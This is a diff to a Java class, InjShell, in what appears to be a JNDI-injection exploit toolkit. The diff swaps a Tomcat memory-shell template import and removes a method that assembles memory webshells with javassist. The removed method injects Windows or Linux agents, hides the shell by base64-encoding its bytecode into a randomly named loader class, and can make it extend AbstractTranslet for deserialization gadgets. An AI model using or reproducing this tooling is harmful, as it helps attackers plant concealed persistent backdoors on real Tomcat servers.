@@ -2,7 +2,7 @@ package com.qi4l.jndi.gadgets.utils;
 
 import com.qi4l.jndi.gadgets.Config.Config;
 import com.qi4l.jndi.template.Agent.WinMenshell;
-import com.qi4l.jndi.template.memshellStatic.tomcat.TSMSFromJMXF;
+import com.qi4l.jndi.template.memshellStatic.tomcat.TFMSFromJMX;
 import javassist.*;
 import org.apache.commons.cli.CommandLine;
 import org.apache.commons.cli.CommandLineParser;
@@ -203,7 +203,7 @@ public class InjShell {
         //添加到类路径，防止出错
         ClassPool pool;
         pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(TSMSFromJMXF.class));
+        pool.insertClassPath(new ClassClassPath(TFMSFromJMX.class));
         // 根据传入的不同参数，在不同方法中插入不同的逻辑
         CtMethod cm = ctClass.getDeclaredMethod(method);
         cm.setBody(payload);
@@ -286,46 +286,6 @@ public class InjShell {
         LinclassBody.set(ctClazz, bytes);
     }
 
-
-    public static String structureShellTom(Class<?> payload) throws Exception {
-        Config.init();
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(payload));
-        CtClass ctClass = pool.get(payload.getName());
-        InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Config.Shell_Type);
-        ctClass.setName(ClassNameUtils.generateClassName());
-        if (Config.winAgent) {
-            TinsertWinAgent(ctClass);
-            return injectClass(WinMenshell.class);
-        }
-        if (Config.linAgent) {
-            TinsertLinAgent(ctClass);
-            return injectClass(WinMenshell.class);
-        }
-        if (Config.HIDE_MEMORY_SHELL) {
-            switch (Config.HIDE_MEMORY_SHELL_TYPE) {
-                case 1:
-                    break;
-                case 2:
-                    CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
-                    newClass.setName(ClassNameUtils.generateClassName());
-                    String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
-                    String className = "className=\"" + ctClass.getName() + "\";";
-                    newClass.defrost();
-                    newClass.makeClassInitializer().insertBefore(content);
-                    newClass.makeClassInitializer().insertBefore(className);
-
-                    if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
-                        Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-                        CtClass superClass   = pool.get(abstTranslet.getName());
-                        newClass.setSuperclass(superClass);
-                    }
-
-                    return injectClass(newClass.getClass());
-            }
-        }
-        return injectClass(ctClass.getClass());
-    }
 
     //类加载方式，因类而异
     public static String injectClass(Class clazz) {
